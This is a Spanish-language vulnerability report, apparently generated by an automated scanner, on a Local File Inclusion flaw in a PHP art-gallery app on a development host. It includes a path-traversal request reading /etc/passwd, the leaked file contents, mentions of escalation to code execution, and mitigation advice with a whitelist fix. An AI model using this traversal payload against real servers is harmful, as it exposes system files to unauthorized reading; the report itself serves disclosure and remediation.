# Informe de Análisis de Seguridad - Local File Inclusion (LFI)

**Fecha:** 2026-04-30 16:23:27  
**Objetivo:** http://web.dev.local:8081  
**Tipo de vulnerabilidad:** Local File Inclusion (LFI)  
**Analista:** Copilot Security Scanner

---

## 1. Resumen Ejecutivo

Se identificó y explotó con éxito una vulnerabilidad de tipo **Local File Inclusion (LFI)** en la aplicación web "Galería de Arte Virtual" alojada en `http://web.dev.local:8081`. La vulnerabilidad permite a un atacante leer archivos arbitrarios del sistema de archivos del servidor mediante la manipulación del parámetro `page` en `gallery.php`.

---

## 2. Descripción de la Vulnerabilidad

| Campo | Detalle |
|-------|---------|
| **Tipo** | Local File Inclusion (LFI) |
| **Severidad** | Alta (CVSS ~7.5) |
| **URL afectada** | `http://web.dev.local:8081/gallery.php` |
| **Parámetro vulnerable** | `page` |
| **CWE** | CWE-22 (Path Traversal) / CWE-98 (Improper Control of Filename for Include/Require Statement) |

### Descripción técnica

La aplicación incluye dinámicamente archivos basándose en el valor del parámetro GET `page`, sin aplicar ningún tipo de sanitización o validación. Esto permite el uso de secuencias de traversal de directorios (`../`) para salir del directorio base y acceder a archivos arbitrarios del sistema.

---

## 3. Evidencia de Explotación

### 3.1 Payload utilizado

```
GET /gallery.php?page=../../../etc/passwd HTTP/1.1
Host: web.dev.local:8081
```

### 3.2 Respuesta del servidor (contenido de `/etc/passwd`)

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
```

### 3.3 Contenido de `/etc/hosts` (acceso adicional verificado)

```
127.0.0.1    localhost
::1          localhost ip6-localhost ip6-loopback
fe00::       ip6-localnet
ff00::       ip6-mcastprefix
ff02::1      ip6-allnodes
ff02::2      ip6-allrouters
172.19.0.2   d5054e367753
```

---

## 4. Impacto

- **Lectura de archivos sensibles del sistema:** `/etc/passwd`, `/etc/hosts`, `/proc/self/environ`, etc.
- **Divulgación de información:** Nombres de usuarios del sistema, rutas internas, configuración de red.
- **Escalada potencial:** En combinación con otras técnicas (log poisoning, PHP wrappers), un LFI puede derivar en Remote Code Execution (RCE).
- **Confidencialidad comprometida:** Acceso no autorizado a datos del sistema operativo.

---

## 5. Recomendaciones de Mitigación

1. **Validación estricta del parámetro `page`:** Usar una lista blanca de valores permitidos (ej. `modern`, `classic`, `abstract`, `about`).
2. **Eliminar la inclusión dinámica de archivos:** Sustituir `include($page)` por un mapa de archivos permitidos.
3. **Sanitizar la entrada:** Eliminar secuencias `../`, `..\\`, y codificaciones URL antes de procesar el parámetro.
4. **Principio de mínimo privilegio:** Ejecutar el servidor web con el mínimo de permisos necesarios.
5. **Configuración de PHP:** Considerar deshabilitar `allow_url_include` y restringir `open_basedir`.

### Ejemplo de código seguro (PHP)

```php
$allowed_pages = ['modern', 'classic', 'abstract', 'about'];
$page = $_GET['page'] ?? 'modern';

if (!in_array($page, $allowed_pages, true)) {
    $page = 'modern'; // valor por defecto seguro
}

include("pages/{$page}.php");
```

---

## 6. Conclusión

La aplicación web presenta una vulnerabilidad crítica de LFI en el parámetro `page` de `gallery.php`. La explotación es trivial y no requiere autenticación. Se recomienda aplicar las correcciones indicadas de forma urgente para prevenir la lectura de archivos sensibles del servidor y posibles vectores de escalada a ejecución remota de código.

---

*Informe generado automáticamente por análisis de seguridad automatizado.*
